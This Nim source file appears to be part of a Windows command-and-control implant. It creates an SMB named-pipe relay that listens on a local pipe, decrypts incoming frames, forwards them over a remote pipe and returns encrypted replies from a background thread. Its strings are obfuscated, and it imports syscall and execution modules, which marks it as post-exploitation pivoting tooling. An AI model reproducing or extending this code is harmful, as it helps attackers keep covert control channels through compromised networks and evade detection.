import std/json
import std/tables
from std/locks import acquire, release
import ./core
from ./frame import processRelayFrame
import ../../utils/global
import ../../utils/network/smb
import ../../utils/crypt/transport
from ../../utils/winapi/handlers import sleepMs
import ../../utils/winapi/syscall
import ../../utils/winapi/utils
from ../execution/core import writeMsg, writeErr

proc relaySmbForwardDestiny(cfg: JsonNode, body: string): string =
  # Forwards the body over the remote pipe
  let remotePath = cfg[obf("remotePipePath")].getStr()
  var h = pipeConnect(remotePath)
  if h == invalidHandle:
    return ""
  try:
    var enc = cryptEncrypt(body)
    writeFrameHandle(h, enc)
    enc.setLen(0)
    let wire = readFrameHandle(h, relayTimeout)
    try:
      result = cryptDecrypt(wire)
    except CatchableError:
      result = ""
  finally:
    pipeClose(h)

proc relaySmbWorker(param: pointer) {.stdcall.} =
  # Here is where the smb relay worker listens and forwards frames
  let heap = cast[ptr string](param)
  let relayId = heap[]
  dealloc(heap)

  while true:
    relayEnsureLock()
    acquire(relayLock)
    if relayId notin relays:
      relayWorkerParked[relayId] = true
      release(relayLock)
      sleepMs(50)
      continue
    relayWorkerParked[relayId] = false
    let cfg = relayCfg(relays[relayId])
    release(relayLock)

    while true:
      if relayShouldStop(relayId):
        break
      let localPath = cfg[obf("localPipePath")].getStr()
      let pipe = pipeListen(localPath)
      if pipe == invalidHandle:
        sleepMs(200)
        continue
      try:
        if not pipeAccept(pipe):
          sleepMs(200)
          continue
        let wire = readFrameHandle(pipe, relayTimeout)
        if wire.len == 0:
          continue
        var frame = ""
        try:
          frame = cryptDecrypt(wire)
        except CatchableError:
          discard
        if frame.len == 0:
          continue
        let response = processRelayFrame(cfg, frame, relaySmbForwardDestiny)
        frame.setLen(0)
        if response.len > 0:
          var enc = cryptEncrypt(response)
          writeFrameHandle(pipe, enc)
          enc.setLen(0)
      finally:
        pipeCloseServer(pipe)

proc relaySmbStart*(relayId: string, cfg: JsonNode, localPipe, remotePipe: string; buf: var openArray[char]): int =
  # Starts the smb relay worker thread
  relayEnsureLock()
  acquire(relayLock)
  let needThread = relayId notin relayWorkerTh or relayWorkerTh[relayId] == nil
  release(relayLock)

  if needThread:
    try:
      let heap = cast[ptr string](alloc0(sizeof(string)))
      heap[] = relayId
      inc bgWorkers
      let th = createThread(cast[pointer](relaySmbWorker), heap)
      if th == nil:
        dec bgWorkers
        dealloc(heap)
        relayMarkStopped(relayId)
        return writeErr(obf("smb relay start failed"), buf)
      relayEnsureLock()
      acquire(relayLock)
      relayWorkerTh[relayId] = th
      release(relayLock)
    except CatchableError as e:
      relayMarkStopped(relayId)
      return writeErr(obf("smb relay start failed: ") & e.msg, buf)
  return writeMsg(obf("relay: id=") & relayId & obf(" listening ") & localPipe &
    obf(" -> ") & cfg[obf("destinyRaw")].getStr(), buf)

relaySmbStartFn = relaySmbStart
